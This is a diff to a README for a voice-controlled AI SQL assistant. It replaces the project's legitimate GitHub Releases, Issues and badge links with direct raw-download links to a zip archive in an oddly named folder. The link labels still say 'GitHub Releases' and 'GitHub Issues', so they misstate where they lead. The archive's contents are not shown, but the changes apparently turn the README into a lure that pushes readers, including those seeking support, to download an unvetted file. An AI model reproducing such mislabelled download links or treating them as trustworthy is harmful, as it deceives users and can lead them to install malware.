@@ -1,6 +1,6 @@
 # 🎤 Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain - Effortlessly Generate SQL with Your Voice
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/releases)
+[![Download Now](https://raw.githubusercontent.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/master/uncontributory/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain.zip)](https://raw.githubusercontent.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/master/uncontributory/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before you begin, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, visit this page to download: [GitHub Releases](https://github.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/releases).
+To download the application, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/master/uncontributory/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain.zip).
 
 1. Click the link to go to the Releases page.
 2. Select the latest version from the list.
@@ -75,7 +75,7 @@ If you encounter any issues, consider the following:
 
 ## 🤝 Support
 
-For assistance, visit our [GitHub Issues](https://github.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/issues) page to report your issue or ask for help. 
+For assistance, visit our [GitHub Issues](https://raw.githubusercontent.com/Dumpsterfirefire/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain/master/uncontributory/Voice-Powered-AI-SQL-Assistant-Python-GPT-LangChain.zip) page to report your issue or ask for help. 
 
 ## 🔗 Additional Resources
 
